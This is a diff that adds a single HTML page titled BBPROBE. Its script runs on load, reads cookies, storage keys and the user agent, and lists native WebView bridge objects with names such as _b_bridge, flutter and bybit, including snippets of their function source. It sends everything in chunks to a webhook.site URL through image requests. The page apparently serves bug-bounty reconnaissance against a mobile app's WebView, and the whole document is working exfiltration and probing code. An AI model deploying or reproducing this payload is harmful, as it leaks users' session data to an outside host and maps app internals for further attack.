@@ -1,0 +1,57 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>BBPROBE</title></head>
+<body><h1>BBPROBE</h1><pre id="o"></pre>
+<script>
+var HOOK = 'https://webhook.site/c05df4a9-d728-4fe6-b222-b27dde6acb80';
+function send(tag, obj) {
+  var s;
+  try { s = (typeof obj === 'string') ? obj : JSON.stringify(obj); } catch (e) { s = 'JSONERR ' + e; }
+  for (var i = 0; i < s.length; i += 1200) {
+    var part = s.substr(i, 1200);
+    try { new Image().src = HOOK + '?tag=' + encodeURIComponent(tag) + '&i=' + i + '&d=' + encodeURIComponent(part); } catch (e) {}
+  }
+  if (s.length === 0) { try { new Image().src = HOOK + '?tag=' + encodeURIComponent(tag) + '&d='; } catch (e) {} }
+}
+function probe() {
+  var out = {};
+  out.href = location.href; out.origin = location.origin; out.ua = navigator.userAgent;
+  out.cookie = document.cookie;
+  try { out.ls = Object.keys(localStorage); } catch (e) { out.ls = 'ERR ' + e; }
+  try { out.ss = Object.keys(sessionStorage); } catch (e) { out.ss = 'ERR ' + e; }
+  var keys = [];
+  try { keys = Object.getOwnPropertyNames(window); } catch (e) {}
+  out.nwin = keys.length;
+  var hits = keys.filter(function (k) { return /_b_bridge|_b_|flutter|jsbridge|webkit|Android|jsInterface|invokeCallback|applet|native|bybit/i.test(k); });
+  out.hits = hits;
+  var detail = {};
+  hits.forEach(function (k) {
+    try {
+      var v = window[k], t = typeof v, m = [];
+      if (v && (t === 'object' || t === 'function')) {
+        try { m = Object.getOwnPropertyNames(v); } catch (e) { m = ['<err ' + e + '>']; }
+      }
+      var s = t + ' | ' + m.join(',');
+      if (t === 'function') { try { s += ' | src=' + String(v).substr(0, 300); } catch (e) {} }
+      detail[k] = s;
+    } catch (e) { detail[k] = 'ERR ' + e; }
+  });
+  out.detail = detail;
+  var mods = {};
+  keys.forEach(function (k) {
+    if (k.indexOf('_b_bridge_') === 0) {
+      try {
+        var o = window[k];
+        mods[k] = { type: typeof o, props: o ? Object.getOwnPropertyNames(o) : null,
+                    proto: o ? Object.getOwnPropertyNames(Object.getPrototypeOf(o) || {}) : null,
+                    src: (o && o.postMessage) ? String(o.postMessage).substr(0, 800) : null };
+      } catch (e) { mods[k] = 'ERR ' + e; }
+    }
+  });
+  out.mods = mods;
+  if (window._b_bridge_callback_) { try { out.cb_src = String(window._b_bridge_callback_).substr(0, 1500); } catch (e) {} }
+  if (window.flutter_inappwebview) { try { out.fiav = Object.getOwnPropertyNames(window.flutter_inappwebview); } catch (e) {} }
+  return out;
+}
+try { send('PROBE', probe()); } catch (e) { send('PROBEERR', '' + e + ' ' + (e && e.stack)); }
+setTimeout(function () { try { send('PROBE2', probe()); } catch (e) { send('PROBE2ERR', '' + e); } }, 4000);
+</script></body></html>
